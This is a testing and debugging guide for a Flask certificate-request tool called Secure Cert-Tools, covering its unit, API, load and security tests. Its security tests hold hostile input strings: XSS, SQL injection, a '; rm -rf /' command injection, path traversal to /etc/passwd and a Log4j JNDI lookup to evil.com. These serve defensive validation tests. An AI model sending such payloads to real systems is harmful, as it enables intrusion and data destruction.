# Testing and Debugging Guide - Secure Cert-Tools

## Table of Contents

1. [Test Suite Overview](#test-suite-overview)
2. [Running Tests](#running-tests)
3. [Test Categories](#test-categories)
4. [Coverage Analysis](#coverage-analysis)
5. [Debugging Techniques](#debugging-techniques)
6. [Common Issues and Solutions](#common-issues-and-solutions)
7. [Performance Testing](#performance-testing)
8. [Security Testing](#security-testing)

---

## Test Suite Overview

### Comprehensive Testing Strategy

The Secure Cert-Tools application employs a multi-layered testing approach with **254+ tests achieving 71% code coverage**:

```
                    ┌─────────────────────────────────────┐
                    │         TEST PYRAMID                │
                    │                                     │
                    │    ┌─────────────────┐              │
                    │    │   End-to-End    │              │
                    │    │     Tests       │              │
                    │    │  (20 tests)     │              │
                    │    └─────────────────┘              │
                    │  ┌─────────────────────┐            │
                    │  │  Integration Tests  │            │
                    │  │    (34 tests)       │            │
                    │  └─────────────────────┘            │
                    │┌─────────────────────────┐          │
                    ││     Unit Tests          │          │
                    ││   (200+ tests)          │          │
                    │└─────────────────────────┘          │
                    └─────────────────────────────────────┘
```

### Test Framework Stack

```python
# Testing Dependencies
pytest==8.4.1                 # Primary test framework
coverage==7.3.2              # Code coverage analysis
requests==2.32.4             # HTTP testing client
flask-testing==0.8.1         # Flask-specific test utilities
```

---

## Running Tests

### Quick Start

```bash
# Install test dependencies
pip install -r requirements-dev.txt

# Run all tests with coverage
python run_comprehensive_tests.py
```

### Individual Test Execution

#### Core Functionality Tests
```bash
# Run core application tests
pytest tests.py -v

# Run with coverage
pytest tests.py --cov=app --cov=csr --cov-report=term-missing -v

# Run specific test classes
pytest tests.py::TestCsrGeneration -v
pytest tests.py::TestDomainValidation -v
```

#### Security Tests
```bash
# CSRF protection tests
pytest test_csrf_security.py -v

# Security hardening tests  
pytest test_security_hardening.py -v

# Enhanced security features
pytest test_enhanced_security.py -v

# All security tests
pytest test_*security*.py -v
```

#### API Tests
```bash
# Start server in testing mode
TESTING=true python start_server.py &

# Run API integration tests
python final_optimized_api_test.py

# Comprehensive API testing
python test_api_comprehensive.py

# Stop test server
pkill -f "python start_server.py"
```

### Continuous Integration Testing

```bash
# Full CI/CD test suite (matches GitHub Actions)
export TESTING=true
export FLASK_ENV=testing

# Run comprehensive test suite
python run_comprehensive_tests.py

# Generate coverage report
pytest --cov=app --cov=csr --cov=_version \
  --cov-report=html --cov-report=term-missing \
  tests.py test_*security*.py
```

---

## Test Categories

### 1. Unit Tests (136 tests)

**Purpose**: Test individual functions and methods in isolation

**Files**: `tests.py`

**Coverage Areas**:
```python
# Core CSR functionality
def test_csr_generation_rsa_2048()
def test_csr_generation_ecdsa_p256()
def test_domain_validation_valid_domains()
def test_domain_validation_invalid_domains()

# Input validation
def test_field_length_limits()
def test_special_characters_sanitization()
def test_rfc_compliance_checking()

# Error handling
def test_missing_required_fields()
def test_invalid_key_sizes()
def test_malformed_domain_names()
```

**Example Test Structure**:
```python
class TestCsrGeneration(unittest.TestCase):
    def setUp(self):
        """Set up test fixtures"""
        self.app = create_test_app()
        self.client = self.app.test_client()
    
    def test_rsa_key_generation(self):
        """Test RSA key pair generation"""
        form_data = {
            'CN': 'test.example.com',
            'keyType': 'RSA',
            'keySize': '2048'
        }
        csr_gen = CsrGenerator(form_data)
        
        # Verify key generation
        self.assertIsNotNone(csr_gen.keypair)
        self.assertIsNotNone(csr_gen.csr)
        self.assertIsNotNone(csr_gen.private_key)
        
        # Verify key properties
        self.assertEqual(csr_gen.keypair.key_size, 2048)
        
    def tearDown(self):
        """Clean up after tests"""
        pass
```

### 2. Integration Tests (34 tests)

**Purpose**: Test component interactions and workflows

**Files**: `test_comprehensive.py`

**Test Scenarios**:
```python
def test_complete_csr_workflow():
    """Test end-to-end CSR generation and verification"""
    # 1. Generate CSR via API
    response = client.post('/generate', data={
        'CN': 'api.example.com',
        'keyType': 'RSA',
        'keySize': '2048'
    })
    
    # 2. Extract CSR and private key
    data = response.get_json()
    csr = data['csr']
    private_key = data['private_key']
    
    # 3. Verify they match
    verify_response = client.post('/verify', data={
        'csr': csr,
        'privateKey': private_key
    })
    
    verify_data = verify_response.get_json()
    assert verify_data['match'] is True

def test_csrf_protection_workflow():
    """Test CSRF token generation and validation"""
    # Get CSRF token from page
    response = client.get('/')
    csrf_token = extract_csrf_token(response.data)
    
    # Use token in POST request
    response = client.post('/generate', data={
        'CN': 'test.com',
        'csrf_token': csrf_token
    })
    
    assert response.status_code == 200
```

### 3. Security Tests (64+ tests)

**Purpose**: Validate security controls and attack prevention

**Files**: `test_csrf_security.py`, `test_security_hardening.py`, `test_enhanced_security.py`

#### CSRF Protection Tests
```python
def test_csrf_token_required():
    """POST requests require CSRF tokens"""
    response = client.post('/generate', data={'CN': 'test.com'})
    assert response.status_code == 400
    assert 'CSRF' in response.get_json()['error']

def test_csrf_token_validation():
    """Invalid CSRF tokens are rejected"""
    response = client.post('/generate', data={
        'CN': 'test.com',
        'csrf_token': 'invalid-token'
    })
    assert response.status_code == 400

def test_csrf_referer_validation():
    """Referer header validation"""
    response = client.post('/generate',
        data={'CN': 'test.com'},
        headers={'Referer': 'https://evil.com'}
    )
    assert response.status_code == 400
```

#### Attack Prevention Tests
```python
def test_xss_prevention():
    """XSS attempts are blocked"""
    malicious_input = '<script>alert("xss")</script>'
    response = client.post('/generate', data={
        'CN': malicious_input
    })
    assert response.status_code == 400
    assert 'Invalid input' in response.get_json()['error']

def test_sql_injection_prevention():
    """SQL injection attempts are blocked"""
    malicious_input = "'; DROP TABLE users; --"
    response = client.post('/generate', data={
        'CN': malicious_input
    })
    assert response.status_code == 400

def test_command_injection_prevention():
    """Command injection attempts are blocked"""
    malicious_input = "; rm -rf /"
    response = client.post('/generate', data={
        'CN': malicious_input
    })
    assert response.status_code == 400
```

#### Rate Limiting Tests
```python
def test_rate_limiting_enforcement():
    """Rate limits are enforced"""
    # Make requests up to the limit
    for i in range(10):
        response = client.post('/generate', data={'CN': f'test{i}.com'})
        assert response.status_code == 200
    
    # Next request should be rate limited
    response = client.post('/generate', data={'CN': 'test11.com'})
    assert response.status_code == 429
    assert 'Rate limit exceeded' in response.get_json()['error']
```

### 4. API Tests (20 tests)

**Purpose**: Test REST API endpoints and responses

**Files**: `test_api_comprehensive.py`, `final_optimized_api_test.py`

```python
def test_version_endpoint():
    """Version endpoint returns correct information"""
    response = client.get('/version')
    assert response.status_code == 200
    
    data = response.get_json()
    assert 'version' in data
    assert 'release_date' in data
    assert 'security_fixes' in data

def test_generate_endpoint_parameters():
    """Generate endpoint accepts all valid parameters"""
    response = client.post('/generate', data={
        'CN': 'api.example.com',
        'C': 'US',
        'ST': 'California',
        'L': 'San Francisco',
        'O': 'Example Corp',
        'OU': 'IT Department',
        'keyType': 'RSA',
        'keySize': '2048',
        'subjectAltNames': '*.example.com,api.example.com'
    })
    
    assert response.status_code == 200
    data = response.get_json()
    assert 'csr' in data
    assert 'private_key' in data
    assert data['csr'].startswith('-----BEGIN CERTIFICATE REQUEST-----')

def test_error_response_format():
    """Error responses follow consistent format"""
    response = client.post('/generate', data={})  # Missing CN
    assert response.status_code == 400
    
    data = response.get_json()
    assert 'error' in data
    assert 'error_type' in data or 'message' in data
```

---

## Coverage Analysis

### Current Coverage Statistics

```
Name                    Statements   Missing   Coverage
--------------------------------------------------------
app.py                      425         153      64%
csr.py                      267          72      73%
_version.py                  43           0     100%
start_server.py             171          87      49%
--------------------------------------------------------
TOTAL                       906         312      71%
```

### Coverage Report Generation

```bash
# Generate HTML coverage report
pytest --cov=app --cov=csr --cov=_version \
  --cov-report=html --cov-report=term-missing \
  tests.py test_*security*.py

# Open coverage report
open htmlcov/index.html

# Generate XML coverage report (for CI/CD)
pytest --cov=app --cov=csr --cov=_version \
  --cov-report=xml \
  tests.py test_*security*.py
```

### Coverage Gaps Analysis

**Areas with Lower Coverage**:

1. **Error Handling Edge Cases** (15% gap)
   - Cryptographic library exceptions
   - Network timeout scenarios
   - Memory exhaustion conditions

2. **Server Startup Logic** (35% gap in `start_server.py`)
   - SSL certificate generation paths
   - Environment variable edge cases
   - Gunicorn configuration scenarios

3. **Logging and Monitoring** (20% gap)
   - Log sanitization edge cases
   - Performance monitoring code paths
   - Error reporting mechanisms

**Improving Coverage**:
```python
# Add tests for edge cases
def test_memory_exhaustion_handling():
    """Test handling of memory exhaustion"""
    # Simulate memory pressure
    
def test_ssl_certificate_generation_failure():
    """Test SSL certificate generation failure scenarios"""
    # Mock certificate generation failure
    
def test_logging_sanitization_edge_cases():
    """Test log sanitization with various inputs"""
    # Test with different malicious inputs
```

---

## Debugging Techniques

### 1. Enable Debug Mode

```bash
# Development with debug enabled
export FLASK_ENV=development
export DEBUG=true
python start_server.py

# Testing with debug
export TESTING=true
export DEBUG=true
python -m pytest tests.py::test_specific_function -v -s
```

### 2. Logging Configuration

```python
# Enhanced logging for debugging
import logging

# Set detailed logging
logging.basicConfig(
    level=logging.DEBUG,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('debug.log'),
        logging.StreamHandler()
    ]
)

# Application-specific logger
logger = logging.getLogger('secure_cert_tools')
logger.setLevel(logging.DEBUG)
```

### 3. Interactive Debugging

```python
# Using pdb for debugging
import pdb

def debug_csr_generation():
    form_data = {'CN': 'test.com'}
    pdb.set_trace()  # Debugger breakpoint
    csr_gen = CsrGenerator(form_data)
    return csr_gen

# Using pytest with pdb
pytest tests.py::test_function --pdb

# Using ipdb (enhanced debugger)
pip install ipdb
import ipdb; ipdb.set_trace()
```

### 4. Mock Testing

```python
from unittest.mock import patch, MagicMock

def test_with_mocked_crypto():
    """Test with mocked cryptographic operations"""
    with patch('cryptography.hazmat.primitives.asymmetric.rsa.generate_private_key') as mock_key_gen:
        mock_key = MagicMock()
        mock_key_gen.return_value = mock_key
        
        # Test with mocked key generation
        result = generate_csr({'CN': 'test.com'})
        
        # Verify mock was called
        mock_key_gen.assert_called_once()
```

### 5. Performance Profiling

```python
import cProfile
import pstats

def profile_csr_generation():
    """Profile CSR generation performance"""
    profiler = cProfile.Profile()
    profiler.enable()
    
    # Run CSR generation
    for i in range(100):
        csr_gen = CsrGenerator({'CN': f'test{i}.com'})
    
    profiler.disable()
    
    # Analyze results
    stats = pstats.Stats(profiler)
    stats.sort_stats('cumulative')
    stats.print_stats(10)  # Top 10 functions
```

---

## Common Issues and Solutions

### 1. CSRF Token Issues

**Problem**: Tests failing with CSRF token errors
```
ERROR: The CSRF token is missing.
```

**Solutions**:
```python
# Solution 1: Use testing mode (disables CSRF)
@pytest.fixture
def client():
    app.config['TESTING'] = True
    app.config['WTF_CSRF_ENABLED'] = False
    return app.test_client()

# Solution 2: Extract CSRF token from response
def get_csrf_token(client):
    response = client.get('/')
    # Extract token from HTML or meta tag
    return extract_csrf_token(response.data)

# Solution 3: Use test request context
def test_with_csrf():
    with app.test_request_context():
        csrf_token = generate_csrf()
        response = client.post('/generate', data={
            'CN': 'test.com',
            'csrf_token': csrf_token
        })
```

### 2. Domain Validation Failures

**Problem**: Valid domains being rejected
```
ERROR: Single-label domains are only allowed for private CA use
```

**Solutions**:
```python
# Use allowPrivateDomains flag for internal domains
def test_private_domain():
    response = client.post('/generate', data={
        'CN': 'server',  # Single-label domain
        'allowPrivateDomains': 'true'
    })
    assert response.status_code == 200

# Check domain validation logic
def debug_domain_validation():
    validator = CsrGenerator({'CN': 'test.com'})
    try:
        validator._validate_domain_rfc_compliance('server', allow_private_domains=True)
    except ValueError as e:
        print(f"Validation error: {e}")
```

### 3. Key Generation Issues

**Problem**: Weak key sizes being used
```
ERROR: Only 2048 and 4096-bit RSA keys are supported
```

**Solutions**:
```python
# Verify supported key sizes
def test_supported_key_sizes():
    valid_sizes = [2048, 4096]
    invalid_sizes = [1024, 512]
    
    for size in valid_sizes:
        csr_gen = CsrGenerator({
            'CN': 'test.com',
            'keyType': 'RSA',
            'keySize': str(size)
        })
        assert csr_gen.keypair.key_size == size
    
    for size in invalid_sizes:
        with pytest.raises(ValueError):
            CsrGenerator({
                'CN': 'test.com',
                'keyType': 'RSA', 
                'keySize': str(size)
            })
```

### 4. Docker Test Issues

**Problem**: Docker container tests failing
```
ERROR: Connection refused
```

**Solutions**:
```bash
# Ensure container is running
docker ps | grep secure-cert-tools

# Check container logs
docker logs secure-cert-tools-container

# Test container health
docker exec secure-cert-tools-container curl -k https://localhost:5555/version

# Debug container networking
docker run -it --rm secure-cert-tools:2.6.0 /bin/bash
```

### 5. Rate Limiting in Tests

**Problem**: Tests failing due to rate limits
```
ERROR: Rate limit exceeded
```

**Solutions**:
```python
# Use separate test client instances
def test_rate_limiting():
    clients = [app.test_client() for _ in range(15)]
    
    # Distribute requests across clients
    for i, client in enumerate(clients):
        response = client.post('/generate', data={'CN': f'test{i}.com'})
        assert response.status_code == 200

# Reset rate limiter between tests
@pytest.fixture(autouse=True)
def reset_rate_limiter():
    # Clear rate limiter storage
    if hasattr(limiter, 'storage'):
        limiter.storage.reset()
```

---

## Performance Testing

### Load Testing

```python
import concurrent.futures
import time

def load_test_csr_generation(num_requests=100, num_workers=10):
    """Load test CSR generation endpoint"""
    
    def generate_csr_request(request_id):
        start_time = time.time()
        
        response = requests.post('https://localhost:5555/generate', 
            data={
                'CN': f'test{request_id}.example.com',
                'keyType': 'RSA',
                'keySize': '2048'
            },
            verify=False  # Skip SSL verification for testing
        )
        
        end_time = time.time()
        return {
            'request_id': request_id,
            'status_code': response.status_code,
            'response_time': end_time - start_time,
            'success': response.status_code == 200
        }
    
    # Execute concurrent requests
    with concurrent.futures.ThreadPoolExecutor(max_workers=num_workers) as executor:
        futures = [
            executor.submit(generate_csr_request, i) 
            for i in range(num_requests)
        ]
        
        results = [future.result() for future in concurrent.futures.as_completed(futures)]
    
    # Analyze results
    success_rate = sum(1 for r in results if r['success']) / len(results)
    avg_response_time = sum(r['response_time'] for r in results) / len(results)
    
    print(f"Load Test Results:")
    print(f"  Requests: {num_requests}")
    print(f"  Success Rate: {success_rate:.2%}")
    print(f"  Average Response Time: {avg_response_time:.3f}s")
    
    return results
```

### Memory Usage Testing

```python
import psutil
import os

def test_memory_usage():
    """Monitor memory usage during CSR generation"""
    process = psutil.Process(os.getpid())
    
    # Baseline memory
    baseline_memory = process.memory_info().rss / 1024 / 1024  # MB
    
    # Generate multiple CSRs
    for i in range(100):
        csr_gen = CsrGenerator({
            'CN': f'test{i}.example.com',
            'keyType': 'RSA',
            'keySize': '2048'
        })
        
        # Force garbage collection
        import gc
        gc.collect()
    
    # Final memory
    final_memory = process.memory_info().rss / 1024 / 1024  # MB
    memory_increase = final_memory - baseline_memory
    
    print(f"Memory Usage:")
    print(f"  Baseline: {baseline_memory:.2f} MB")
    print(f"  Final: {final_memory:.2f} MB")
    print(f"  Increase: {memory_increase:.2f} MB")
    
    # Assert reasonable memory usage
    assert memory_increase < 50, f"Memory increase too high: {memory_increase} MB"
```

---

## Security Testing

### Penetration Testing Scripts

```python
def test_security_headers():
    """Test security headers are present"""
    response = requests.get('https://localhost:5555/', verify=False)
    
    required_headers = {
        'X-Content-Type-Options': 'nosniff',
        'X-Frame-Options': 'DENY',
        'X-XSS-Protection': '1; mode=block',
        'Strict-Transport-Security': 'max-age=31536000'
    }
    
    for header, expected_value in required_headers.items():
        assert header in response.headers
        assert expected_value in response.headers[header]

def test_input_fuzzing():
    """Fuzz test with various malicious inputs"""
    malicious_inputs = [
        '<script>alert("xss")</script>',
        '"; DROP TABLE users; --',
        '../../etc/passwd',
        '\x00\x01\x02\x03',  # Binary data
        'A' * 10000,  # Very long input
        '${jndi:ldap://evil.com/x}',  # Log4j style
        '\n\r\nHTTP/1.1 200 OK\r\n\r\n<html>...',  # HTTP smuggling
    ]
    
    for malicious_input in malicious_inputs:
        response = requests.post('https://localhost:5555/generate',
            data={'CN': malicious_input},
            verify=False
        )
        
        # Should be rejected
        assert response.status_code in [400, 422]
        
        # Should not contain the malicious input in response
        assert malicious_input not in response.text

def test_dos_protection():
    """Test denial of service protection"""
    # Test large request
    large_data = {'CN': 'A' * 1000000}  # 1MB
    response = requests.post('https://localhost:5555/generate',
        data=large_data,
        verify=False
    )
    assert response.status_code == 413  # Request entity too large
    
    # Test many concurrent requests
    import threading
    
    def make_request():
        requests.post('https://localhost:5555/generate',
            data={'CN': 'test.com'},
            verify=False
        )
    
    threads = [threading.Thread(target=make_request) for _ in range(50)]
    for thread in threads:
        thread.start()
    
    for thread in threads:
        thread.join()
    
    # Check if rate limiting kicks in
    response = requests.post('https://localhost:5555/generate',
        data={'CN': 'test.com'},
        verify=False
    )
    # May be rate limited at this point
```

This comprehensive testing and debugging guide provides developers with all the tools and knowledge needed to effectively test, debug, and maintain the Secure Cert-Tools application.
